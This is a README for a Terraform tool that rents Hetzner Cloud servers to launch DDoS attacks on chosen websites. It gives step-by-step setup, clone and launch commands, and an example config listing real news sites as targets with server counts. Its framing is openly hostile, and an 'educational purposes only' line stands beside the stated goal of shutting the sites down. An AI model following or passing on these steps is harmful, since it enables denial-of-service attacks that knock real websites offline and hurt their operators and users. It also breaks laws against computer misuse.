## DDoS via Hetzner Cloud 

**hcloud-tf-kozak-launcher** helps easily launch DDoS servers via hetzner cloud (aws alternative) and, for instance, shut down russian fuckers' websites. (But it must be used for educational purposes only).

Note: payment for hcloud is about $1 to $5 per day.



How it works:
- Indicate the number of servers for DDoS attacks.
- Indicate domains you want to shut down.
- Using terraform launch these servers.
- Stop servers when you no longer need them working.
- Launch servers again indicating other websites.

## Install additional services 

**1. Create an account on [hetzner:cloud](https://www.hetzner.com/cloud)**
    
**2. Create a new project on [hetzner](https://www.hetzner.com/cloud)**

**3. Generate API-roken on [hetzner](https://www.hetzner.com/cloud)**

*PROJECT_NAME -> Security -> API TOKENS -> GENERATE API TOKEN (choose Read + Write)
    
**4. Open console**

**5. Export API token**
```bash
export TF_VAR_hcloud_token=<your token>
```
**6. Install terraform** ([installation guide](https://learn.hashicorp.com/tutorials/terraform/install-cli))

## Attack
**1. Clone project from Github and go to root directory**
```bash
git clone https://github.com/higef/hcloud-tf-kozak-launcher.git
cd hcloud-tf-kozak-launcher
```
**2. Fill config.yml (located in proejct's directoy) with sites and number of servers**
```yml
targets:
  - host: https://ria.ru
    count: 10
  - host: https://www.rt.com
    count: 3
```
**3. Launch servers and start DDoS**

```terraform
terraform init
terraform apply -auto-approve"
```

**4. Stop these servers, when you are done**

```terraform
terraform destroy -auto-approve
```
